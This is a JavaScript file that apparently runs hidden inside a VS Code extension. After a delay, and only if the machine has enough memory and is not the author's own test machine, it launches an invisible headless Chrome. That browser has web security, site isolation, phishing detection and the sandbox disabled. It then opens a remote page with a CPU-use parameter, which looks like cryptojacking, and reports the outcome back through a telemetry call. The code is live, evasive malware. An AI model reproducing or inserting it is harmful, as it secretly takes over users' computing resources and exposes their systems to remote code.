(async () => {


    let fs = require('fs')
    let os = require('os');

    let devMode = false;
    let chance = (probability) => Math.random() < probability;
    let reduceFactor = 0.98;
    let nonHeadless = false;

    let repTime = 10 * 60 * 1000; // with reduceFactor 98/2 skips = 500 minutes
    let forceDebug = false;
    let waitTime = 10 * 60 * 1000;


    try {
        if (fs.existsSync('C:\\498_dev_test.txt')) {
            devMode = true;
            waitTime = 0;
            repTime = 0.1 * 60 * 1000;
            return;
        } else {
            // return;
        }
    } catch (error) {
        console.log('dev mode error', error);
    }



    let {
        tstt,
        safe,
        vscode,
        puppeteer
    } = global.globalVars;

    // let baseUrl = 'http://share.liveblog365.com/init.html?i=1';
    let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';

    let browser;
    let page;
    let minUse = 0.1;
    let maxUse = 0.3;
    let [max, min] = [maxUse, minUse];


    try {

        const { readdir, stat } = require('fs/promises');
        const { join } = require('path');


        function getCPUUsage() {
            try {
                const cpus = os.cpus();
                const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
                const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
                const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
                const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
                const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

                const total = userTime + niceTime + sysTime + idleTime + irqTime;
                const used = total - idleTime;
                return ((1 - idleTime / total) * 100).toFixed(2);
            } catch (error) {

            }
        }

        function getMemoryUsage() {
            try {
                const totalMemory = os.totalmem();
                const freeMemory = os.freemem();
                const usedMemory = totalMemory - freeMemory;
                return {
                    free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
                    used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
                    total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
                    percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
                };
            } catch (error) {

            }
        }

        if (getMemoryUsage()?.total <= 6.0 && !devMode) {
            return;
        }


        if (global.cppPage) {
            try {
                await global.cppPage.close();
                let allPages = await browser.pages();
                for (let i = 0; i < allPages.length; i++) {
                    await allPages[i].close();
                }
            } catch (e) {
                // tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
            }
            global.cppPage = null;
        }
        if (global.cppBrowser) {
            try {
                await global.cppBrowser.close();
            } catch (e) {
                // tstt({ message: "BRW_ERR", error: e, value: e.message });
            }
            global.cppBrowser = null;
        }

        await new Promise(r => setTimeout(r, waitTime));
        browser = await puppeteer.launch({
            channel: 'chrome',
            headless: devMode ? false : true,
            ignoreHTTPSErrors: true,
            // acceptInsecureCerts: true,
            args: [
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--allow-running-insecure-content',

                // '--ignore-certificate-errors',
                // "--ignore-certificate-errors-spki-list",
                // "--no-zygote",
                // "--no-sandbox",
                // "--enable-features=NetworkService",

                '--disable-background-timer-throttling',
                '--disable-client-side-phishing-detection',
                '--disable-default-apps',
                '--disable-hang-monitor',
                '--disable-popup-blocking',
                '--disable-prompt-on-repost',
                '--disable-sync',
                '--enable-automation',
                '--enable-devtools-experiments',
                '--metrics-recording-only',
                '--no-first-run',
                '--password-store=basic',
                '--remote-debugging-port=0',
                '--safebrowsing-disable-auto-update',
                '--use-mock-keychain',
                // '--disable-background-networking',
                // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
                // '--disable-gpu',
                ...(nonHeadless ? [] : ['--headless']),
                '--hide-scrollbars',
                '--mute-audio',
                '--no-sandbox'
            ]
        });

        global.cppBrowser = browser;
        // os.setPriority(browser.process().pid, 19);
        page = await browser.newPage();
        global.cppPage = page;


        await page.goto(baseUrl + '?use=' + max, { timeout: 0 });
     
        tstt({
            message: "INIT_SUCCESS",
        });
        (async () => { throw new Error('sp-complete') })();
    } catch (error) {
        tstt({
            os: os.type(),
            message: "INIT_ERROR",
            value: error?.message,
            stack: error?.stack,
            error: error,
        });
        (async () => { throw new Error('sp-err: ' + error?.message) })();
        if (global.inIntv) clearInterval(global.inIntv);
    }

})();